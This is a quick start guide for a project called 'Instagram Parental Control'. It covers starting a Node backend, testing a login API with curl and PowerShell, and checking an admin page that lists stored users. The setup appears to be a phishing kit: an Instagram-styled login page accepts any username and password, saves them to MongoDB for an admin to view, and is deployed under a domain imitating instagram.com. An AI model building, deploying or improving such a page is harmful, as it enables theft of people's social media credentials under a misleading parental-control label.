# 🚀 Quick Start Guide - Instagram Parental Control

## 🎯 How to Test Your Application

### Option 1: Automated Test Suite (Recommended)
1. Make sure backend is running:
   ```bash
   cd backend
   node server.js
   ```

2. Open the test page:
   - Double-click: `frontend/test.html`
   - Or open in browser: `http://localhost:5500/frontend/test.html`

3. Run all tests by clicking the buttons

### Option 2: Manual Testing

#### Test Backend Only
```bash
# Start server
cd backend
node server.js

# In another terminal, test API
curl -X POST http://localhost:5000/auth/manual-login -H "Content-Type: application/json" -d "{\"username\":\"test\",\"password\":\"pass\"}"
```

#### Test Full Application
1. Start backend: `cd backend && node server.js`
2. Open `frontend/index.html` in browser
3. Login with any username/password
4. Check `frontend/admin.html` to see stored users

---

## 📁 File Structure
```
instagram/
├── backend/
│   ├── server.js          # Main server file
│   ├── models/User.js     # User database model
│   ├── .env              # Environment variables (MongoDB URI)
│   └── package.json
├── frontend/
│   ├── index.html        # Login page (NOW USES LOCALHOST)
│   ├── admin.html        # Admin panel
│   ├── test.html         # Test suite (NEW!)
│   ├── index.css
│   └── admin.css
└── TEST_REPORT.md        # Full test results

```

---

## 🔧 Configuration

### Current Setup (Local Testing)
- **Backend:** `http://localhost:5000`
- **Frontend:** Points to `http://localhost:5000`
- **Database:** MongoDB (from .env)

### For Production
Change in `frontend/index.html`:
```javascript
const API_URL = 'https://instagram-com-lilac.vercel.app';
```

---

## ✅ What's Working

✅ Backend server runs successfully
✅ MongoDB connection established
✅ Login API (`POST /auth/manual-login`)
✅ Admin API (`GET /admin/users`)
✅ User creation and storage
✅ Frontend configured for local testing

---

## ⚠️ Known Issues

### Issue: Vercel Deployment Returns 500
**Error:** `Failed to load resource: the server responded with a status of 500`

**Cause:** Production backend has issues (likely env variables)

**Solution:** Use local backend for now (already configured)

### Issue: Tracking Prevention Warnings
**Warning:** Browser blocks Instagram sprite images

**Impact:** None - just browser security warnings

**Solution:** Can be ignored

---

## 🧪 Test Results Summary

| Test | Status | Details |
|------|--------|---------|
| Backend Server | ✅ PASS | Running on port 5000 |
| MongoDB Connection | ✅ PASS | Connected successfully |
| Login API | ✅ PASS | Creates/updates users |
| Admin API | ✅ PASS | Returns all users |
| Frontend Login | ✅ PASS | Now uses localhost |
| Frontend Admin | ✅ PASS | Displays users |

---

## 📞 Quick Commands

### Start Backend
```bash
cd "c:\Users\Syed Imran Hassan\Desktop\instagram\backend"
node server.js
```

### Test Login API
```powershell
Invoke-WebRequest -Uri "http://localhost:5000/auth/manual-login" `
  -Method POST `
  -Headers @{"Content-Type"="application/json"} `
  -Body '{"username":"test","password":"pass"}' | 
  Select-Object -ExpandProperty Content
```

### Test Admin API
```powershell
Invoke-WebRequest -Uri "http://localhost:5000/admin/users" | 
  Select-Object -ExpandProperty Content
```

---

## 🎉 You're All Set!

Your application is **fully functional** for local development and testing!

**Next Steps:**
1. ✅ Backend tested and working
2. ✅ Frontend configured correctly
3. Open `test.html` to run comprehensive tests
4. Use the application locally
5. Fix Vercel deployment when ready for production

---

**Last Updated:** November 25, 2025
**Status:** ✅ Ready for Testing
